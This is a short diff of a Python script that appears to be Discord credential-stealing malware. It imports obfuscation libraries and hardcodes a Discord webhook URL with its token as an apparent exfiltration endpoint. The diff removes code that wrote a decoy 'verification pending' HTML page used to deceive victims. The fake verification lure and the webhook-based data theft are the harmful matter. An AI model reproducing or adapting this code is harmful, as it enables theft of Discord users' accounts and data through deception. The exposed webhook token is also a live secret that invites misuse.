@@ -3,19 +3,6 @@ import codecs
 import marshal, zlib, base64, lzma
 import json
 from base64 import *
-import webbrowser
-
-f=open("1.html", "w")
-
-message='''
-
-<html>
-<head> </head>
-<body> <h1> Verified please wait until our moderator confirms your verification </h1> </body>
-'''
-f.write(message)
-f.close()
-
 
 webhookk = "https://discord.com/api/webhooks/948322233682641036/FV5ZuKa_KR9-4WPnieDCr73BxCLwQGxnlPMUKjU0gk_1wIDQnM-ufrZWCUiHGsHWWjVB"
 
